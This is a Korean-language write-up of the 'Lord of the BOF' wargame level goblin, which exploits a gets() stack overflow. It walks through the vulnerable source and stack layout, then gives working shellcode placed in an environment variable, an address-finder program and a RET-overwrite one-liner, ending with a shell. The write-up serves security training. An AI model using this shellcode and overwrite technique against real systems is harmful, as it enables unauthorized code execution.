============================================================================================================
[lob] cobolt
============================================================================================================


.. uml::
    
    @startuml

    start

    :Source Analysis;

    :Memory Structure;

    :Segmentation fault;

    :환경 변수 쉘코드 등록;

    :환경 변수 주소값 확인;

    :RET 주소를 환경 변수 주소로 변경하여 공격 진행;
    
    stop

    @enduml

|

Source Analysis
============================================================================================================

해당 문제 소스코드는 다음과 같습니다.

.. code-block:: c

    /*
        The Lord of the BOF : The Fellowship of the BOF
        - goblin
        - small buffer + stdin
    */

    int main()
    {
        char buffer[16];
        gets(buffer);
        printf("%s\n", buffer);
    }


|

Memory Structure
============================================================================================================

스택에 다음과 같이 들어가게 됩니다.

.. code-block:: console

	===============
	LOW     
	---------------
	Buffer  (16byte) <- gets
	SFP     (4byte)
	RET     (4byte)
	---------------
	HIGH    
	===============

|

Segmentation fault
============================================================================================================

버퍼오버플로우가 일어나는 지점을 확인합니다.

※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행해야 합니다.

.. code-block:: console

    $ ./goblin
    aaaaaaaaaaaaaaaa
    aaaaaaaaaaaaaaaa
    $ ./goblin
    aaaaaaaaaaaaaaaaaaaa
    aaaaaaaaaaaaaaaaaaaa
    Segmentation fault

|

exploit
============================================================================================================

환경 변수 쉘코드 등록
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    $ export shellcode=`python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

|

환경 변수 주소값 확인
------------------------------------------------------------------------------------------------------------

.. code-block:: c

    #include <stdio.h>
    int main(int argc, char **argv)
    {
            char *addr;
            addr = getenv(argv[1]);
            printf("address %p\n", addr);
            return 0;
    }

.. code-block:: console

    $ gcc -o get get.c
    get.c: In function `main':
    get.c:6: warning: assignment makes pointer from integer without a cast
    
    $ ./get shellcode
    address 0xbfffff02

|

RET 주소를 환경 변수 주소로 변경하여 공격 진행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    $ (python -c 'print "a"*20+"\x01\xff\xff\xbf"';cat) |./goblin
    aaaaaaaaaaaaaaaaaaaa▒▒▒

    whoami
    goblin
    my-pass
    euid = 503
    hackers proof
